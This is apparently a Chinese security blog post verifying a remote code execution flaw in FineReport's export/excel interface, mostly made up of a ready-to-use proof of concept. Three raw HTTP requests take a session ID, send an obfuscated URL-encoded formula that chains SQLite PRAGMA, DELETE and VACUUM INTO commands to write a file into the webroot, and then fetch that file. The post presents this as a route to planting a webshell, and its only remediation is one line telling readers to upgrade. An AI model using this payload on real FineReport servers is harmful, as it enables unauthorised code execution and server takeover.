#  漏洞验证-帆软 FineReport export/excel远程代码执行  
Domren
                    Domren  网安智界   2026-01-20 03:06  
  
一、漏洞描述  
  
帆软 FineReport 是一款专业的企业级 Web 报表和数据分析软件，它允许用户通过拖拽式操作快速设计复杂报表，并支持多种数据源的连接与可视化展示。该系统存在后台远程代码执行漏洞，攻击者可通过export/excel接口构造SQL语句，通过导出文件写入Webshell，进而获取服务器权限，该漏洞可结合前台获取SessionID漏洞达到前台远程代码执行。  
  
二、漏洞POC  
  
1、获取id  
  
GET /webroot/ReportServer HTTP/1.1  
  
Host: XXXX  
  
Cache-Control: max-age=0  
  
Accept-Language: zh-CN,zh;q=0.9  
  
Upgrade-Insecure-Requests: 1  
  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36  
  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7  
  
Accept-Encoding: gzip, deflate, br  
  
viewlets: [{'reportlet':'/'}]  
  
op: getSessionID  
  
  
2、  
用获取的id构造数据包  
  
GET /webroot/decision/nx/report/v9/largedataset/export/excel?functionParams=%7B%7D&__parameters__=%7B%7D HTTP/1.1  
  
Host: XXXX  
  
Cache-Control: max-age=0  
  
Accept-Language: zh-CN,zh;q=0.9  
  
Upgrade-Insecure-Requests: 1  
  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36  
  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7  
  
Accept-Encoding: gzip, deflate, br  
  
sessionID: cd1c0673-ad9f-4261-870c-90736bfe1de4  
  
params: %3Cpd%3E%0A+%3CLargeDatasetExcelExportJS+dsName%3D%221%22%3E%0A%3CParameters%3E%3CParameter%3E%0A%3CAttributes+name%3D%22c%22%2F%3E%3CO+t%3D%22Formula%22%3E%3CAttributes%3E%3C%21%5BCDATA%5Bsql%28%27FRDemo%27%2CCONCATENATE%28%22pr%22%2C%22agm%22%2C%22a+wr%22%2C%22i%22%2C%22t%22%2C%22a%22%2C%22ble%22%2C%22_sch%22%2C%22e%22%2C%22ma%3Do%22%2C%22n%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22dele%22%2C%22t%22%2C%22e+f%22%2C%22r%22%2C%22o%22%2C%22m+sq%22%2C%22li%22%2C%22t%22%2C%22e_sc%22%2C%22he%22%2C%22ma+w%22%2C%22here%22%2C%22+na%22%2C%22m%22%2C%22e%21%22%2C%22%3D%22%2C%22%27s%22%2C%22ql%22%2C%22ite%22%2C%22_s%22%2C%22ta%22%2C%22t%22%2C%221%27%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22an%22%2C%22aly%22%2C%22ze%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22re%22%2C%22p%22%2C%22lac%22%2C%22e+i%22%2C%22nto%22%2C%22+s%22%2C%22ql%22%2C%22ite_%22%2C%22st%22%2C%22at%22%2C%221+va%22%2C%22lu%22%2C%22es%28%27%22%2C%22%27%2C%27123%22%2C%22%27%22%2C%22%29%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22V%22%2C%22A%22%2C%22C%22%2C%22U%22%2C%22U%22%2C%22M%22%2C%22+i%22%2C%22nt%22%2C%22o%28%27%22%2CENV_HOME%2C%22%2F%22%2C%22.%22%2C%22.%22%2C%22%2F%22%2C%22.%22%2C%22%2F%22%2C%22123%22%2C%22.%22%2C%22t%22%2C%22x%22%2C%22t%22%2C%22%27%29%22%29%2C1%29%5D%5D%3E%3C%2FAttributes%3E%3C%2FO%3E%3C%2FParameter%3E%3C%2FParameters%3E%3C%2FLargeDatasetExcelExportJS%3E%3C%2Fpd%3E  
  
3、  
访问生成的文件  
  
GET /webroot/123.txt HTTP/1.1  
  
Host: XXXX  
  
Cache-Control: max-age=0  
  
Accept-Language: zh-CN,zh;q=0.9  
  
Upgrade-Insecure-Requests: 1  
  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36  
  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7  
  
Accept-Encoding: gzip, deflate, br  
  
  
三、验证截图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/4GMSIbPibVJ8e7edPoTEHHtUvJ5RY2jX7OkH9YxB8JGYUojQRTNJwN1PW9ibjcg3zKjxpibChiaYHz81ibPjMzNCb5Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/4GMSIbPibVJ8e7edPoTEHHtUvJ5RY2jX7mUKT2vVlmEDqFGe5hSsYKdHKty419esnVQibEdFOl8VWxBOOvnsVlqA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/4GMSIbPibVJ8e7edPoTEHHtUvJ5RY2jX7hyibybXMxGq48D85oXuM85Q1icfs472ga902Ze98EiaMibia2mgz8vbRtbA/640?wx_fmt=png&from=appmsg "")  
  
四、整改建议  
  
联系官方升级到最新版本。  
  
  
  
  
